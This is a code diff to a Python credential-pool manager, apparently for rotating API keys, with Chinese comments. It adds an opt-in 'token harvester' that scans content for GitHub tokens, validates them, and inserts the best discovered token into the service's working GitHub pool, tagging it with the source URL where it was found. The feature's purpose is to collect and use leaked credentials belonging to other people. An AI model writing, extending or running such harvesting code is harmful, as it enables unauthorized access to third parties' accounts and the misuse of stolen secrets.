@@ -21,6 +21,7 @@ from .models import (
 from ..storage.vault import CredentialVault
 from ..balancer.strategies import LoadBalancingStrategy, get_strategy
 from ..healing.health_check import HealthChecker
+from ..discovery.token_harvester import TokenHarvester, get_token_harvester
 
 # 配置日志
 logger = logging.getLogger(__name__)
@@ -55,6 +56,11 @@ class CredentialManager:
         
         # 健康检查器
         self.health_checker = HealthChecker(self)
+        
+        # Token收集器（可选功能）
+        self.token_harvester = None
+        if self.config.get("harvesting_enabled", False):
+            self.token_harvester = get_token_harvester(self.config)
         
         # 线程锁
         self.lock = threading.RLock()
@@ -96,7 +102,8 @@ class CredentialManager:
             "discovery_enabled": True,
             "discovery_interval": 300,
             "auto_recovery": True,
-            "predictive_maintenance": True
+            "predictive_maintenance": True,
+            "harvesting_enabled": False  # Token收集功能默认关闭
         }
     
     def _initialize_pools(self):
@@ -197,9 +204,11 @@ class CredentialManager:
         while True:
             try:
                 time.sleep(interval)
-                # 这里将调用discovery模块
                 logger.info("Running credential discovery...")
-                # TODO: 实现发现逻辑
+                
+                # 如果启用了Token收集器
+                if self.token_harvester and self.token_harvester.enabled:
+                    self._run_token_harvesting()
                 
             except Exception as e:
                 logger.error(f"Discovery error: {e}")
@@ -523,6 +532,72 @@ class CredentialManager:
                     self.vault.save(credential)
         
         logger.info("CredentialManager shutdown complete")
+    
+    def _run_token_harvesting(self):
+        """运行Token收集流程"""
+        if not self.token_harvester or not self.token_harvester.enabled:
+            return
+        
+        try:
+            # 清理过期tokens
+            self.token_harvester.cleanup_expired_tokens()
+            
+            # 检查是否应该使用发现的tokens
+            if self.token_harvester.should_use_discovered_token():
+                best_token = self.token_harvester.get_best_discovered_token()
+                
+                if best_token:
+                    # 将发现的token添加到池中
+                    metadata = {
+                        "source": "discovered",
+                        "risk_level": best_token.risk_level.name,
+                        "discovered_at": best_token.discovered_at.isoformat(),
+                        "source_url": best_token.source_url
+                    }
+                    
+                    # 添加到GitHub池
+                    result = self.add_credential(
+                        ServiceType.GITHUB,
+                        best_token.token,
+                        metadata
+                    )
+                    
+                    if result:
+                        logger.info(f"✅ Added discovered token to pool: {best_token.masked_token}")
+                        self.token_harvester.stats['total_added'] += 1
+                    else:
+                        self.token_harvester.stats['total_rejected'] += 1
+            
+            # 记录统计
+            stats = self.token_harvester.get_statistics()
+            logger.info(f"Token harvesting stats: {stats}")
+            
+        except Exception as e:
+            logger.error(f"Token harvesting error: {e}")
+    
+    async def scan_content_for_tokens(self, content: str, source_url: str = "") -> int:
+        """
+        扫描内容中的tokens
+        
+        Args:
+            content: 要扫描的内容
+            source_url: 内容来源
+            
+        Returns:
+            发现的token数量
+        """
+        if not self.token_harvester or not self.token_harvester.enabled:
+            return 0
+        
+        discovered = self.token_harvester.extract_tokens_from_content(content, source_url)
+        
+        # 验证发现的tokens
+        validated_count = 0
+        for token in discovered:
+            if await self.token_harvester.validate_token(token):
+                validated_count += 1
+        
+        return validated_count
 
 
 # 全局实例
